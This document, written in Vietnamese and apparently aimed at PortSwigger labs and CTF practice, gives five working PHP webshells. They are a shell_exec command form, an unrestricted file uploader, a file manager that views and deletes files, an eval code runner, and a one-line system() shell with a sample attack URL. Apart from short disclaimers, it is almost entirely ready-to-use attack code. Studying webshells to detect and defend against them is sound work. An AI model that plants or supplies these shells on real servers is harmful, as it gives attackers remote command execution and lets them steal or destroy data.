#portswinger
Dưới đây là một số form PHP webshell phổ biến, thường được dùng trong kiểm thử bảo mật hoặc môi trường huấn luyện (CTF, lab). **Chỉ sử dụng trên hệ thống bạn có quyền kiểm soát hợp pháp, tuyệt đối không dùng vào mục đích trái phép.**

### 1. Form thực thi lệnh hệ thống (Command Execution)
```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>
<form method="GET">
    <input type="text" name="cmd" placeholder="Nhập lệnh..." size="50">
    <input type="submit" value="Thực thi">
</form>
```
*Lưu ý:* Có thể gửi qua GET hoặc POST.

### 2. Form upload file bất kỳ (File Upload)
```php
<?php
if(isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "Upload thành công: " . $_FILES['file']['name'];
}
?>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
```

### 3. Form duyệt và quản lý file cơ bản (File Manager)
```php
<?php
$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
echo "Thư mục hiện tại: <b>".realpath($dir)."</b><hr>";
if(isset($_GET['view'])){
    highlight_file($_GET['view']);
    die();
}
if(isset($_GET['del'])){
    unlink($_GET['del']);
    echo "Đã xóa: ".$_GET['del'];
}
$files = scandir($dir);
foreach($files as $f){
    if($f == '.' || $f == '..') continue;
    $path = $dir.'/'.$f;
    $link = "?dir=".urlencode($dir);
    if(is_dir($path)){
        echo "[DIR] <a href='?dir=".urlencode($path)."'>$f</a><br>";
    } else {
        echo "[FILE] $f 
        <a href='?view=".urlencode($path)."'>[Xem]</a> 
        <a href='?del=".urlencode($path)."' onclick=\"return confirm('Xóa?')\">[Xóa]</a><br>";
    }
}
?>
```

### 4. Form thực thi mã PHP trực tiếp (Code Execution qua `eval`)
```php
<?php
if(isset($_POST['code'])){
    eval($_POST['code']);
}
?>
<form method="POST">
    <textarea name="code" rows="10" cols="80" placeholder="Nhập mã PHP..."></textarea><br>
    <input type="submit" value="Thực thi">
</form>
```
*Rất nguy hiểm nếu không giới hạn quyền.*

### 5. WebShell ẩn đơn giản (chỉ một dòng, không cần form)
```php
<?php system($_GET['c']); ?>
```
Sử dụng: `http://target.com/shell.php?c=ls`

Tất cả các đoạn code trên đều mang tính chất minh họa cho mục đích nghiên cứu bảo mật. Việc triển khai trên môi trường thực tế cần được kiểm soát chặt chẽ để tránh bị lạm dụng.